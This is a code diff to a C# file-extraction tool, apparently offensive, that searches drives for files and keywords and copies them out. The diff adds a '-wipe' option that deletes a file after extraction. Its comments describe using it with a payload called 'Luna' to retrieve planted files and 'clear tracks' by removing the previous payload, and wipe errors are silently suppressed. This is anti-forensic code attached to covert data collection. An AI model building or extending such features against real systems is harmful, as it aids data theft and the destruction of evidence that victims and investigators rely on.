@@ -41,6 +41,10 @@ namespace SmartFileExtract
         static void Main(string[] args)
         {
             startMethodType startMethod = startMethodType.startMission;
+            // Optional single file to wipe (this is intended to work with Luna where we are taking a long game - installing Luna
+            // to place local file and then getting it and clearing tracks
+            string wipeFile = "";
+
 
             if (SFEGeneral.hasSwitch(args, "help") == " " || SFEGeneral.hasSwitch(args, "?") == " ")
             {
@@ -75,7 +79,7 @@ namespace SmartFileExtract
                         fileExtract.targetDrive = SFEGeneral.hasSwitch(args, "drive").Split(';');                        
                         fileExtract.targetFiles = SFEGeneral.hasSwitch(args, "file").Split(';');
                         fileExtract.keywords = SFEGeneral.hasSwitch(args, "keyword").Split(';');
-                        fileExtract.copyTo = SFEGeneral.hasSwitch(args, "copyto");
+                        fileExtract.copyTo = SFEGeneral.hasSwitch(args, "copyto");                        
 
                         // Optional parameters
                         // Total bytes (translated from MBs)
@@ -110,10 +114,27 @@ namespace SmartFileExtract
                                 fileExtract.performanceModel = selPerf;
                         }
 
+                        // Wipe of single file (remove previous payload
+                        if (!String.IsNullOrEmpty(SFEGeneral.hasSwitch(args, "wipe")))
+                        {
+                            wipeFile = SFEGeneral.hasSwitch(args, "wipe");
+                        }
+                        
                         // Start search
                         if (fileExtract.isReady())
                         {
-                            fileExtract.startExtract();                           
+                            fileExtract.startExtract();
+
+                            // Do a single file wipe if necessary
+                            if (!String.IsNullOrEmpty(wipeFile))
+                            {
+                                try
+                                {
+                                    SFEGeneral.WipeFile(wipeFile);
+                                }
+                                catch
+                                { }
+                            }
                         }
                         else
                         {
